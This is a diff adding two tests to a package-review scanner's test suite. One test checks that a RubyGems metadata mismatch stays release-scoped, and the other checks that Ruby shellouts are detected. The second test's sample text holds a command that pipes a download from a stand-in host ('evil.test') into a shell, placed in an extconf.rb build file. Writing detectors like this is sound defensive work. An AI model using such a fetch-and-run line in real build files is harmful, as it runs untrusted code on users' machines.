@@ -587,6 +587,50 @@ describe("review", () => {
     });
   });
 
+  test("keeps RubyGems release findings release scoped even without a diff path match", () => {
+    const annotated = annotateFindingsWithDiffStatus(
+      [
+        {
+          id: "rubygems-identity",
+          ruleId: "rubygems.metadata-mismatch",
+          severity: "critical",
+          file: "demo-1.0.0.gem (gemspec)",
+          evidence: "gemspec name disagrees with manifest",
+          reason: "the release artifact gem name does not match the reviewed manifest",
+        },
+      ],
+      [{ path: "ruby/lib/demo.rb", status: "added" }],
+    );
+
+    expect(annotated[0]).toMatchObject({
+      diffStatus: "unknown",
+      releaseDelta: true,
+    });
+    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("critical");
+  });
+
+  test("detects Ruby shellouts without parentheses", () => {
+    const staged = [
+      {
+        path: "ext/demo/extconf.rb",
+        size: 100,
+        sha256: "ruby-shellout",
+        flags: [],
+        textSample: 'system "curl https://evil.test/install | sh"\n`whoami`\n',
+      },
+    ];
+    const diff = createPackageDiff([], staged);
+    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "ruby" });
+
+    expect(findings).toContainEqual(
+      expect.objectContaining({
+        file: "ext/demo/extconf.rb",
+        ruleId: "code.process-execution",
+        line: 1,
+      }),
+    );
+  });
+
   test("keeps modified-file findings release scoped when a later matching line changed", () => {
     const previous = [
       {
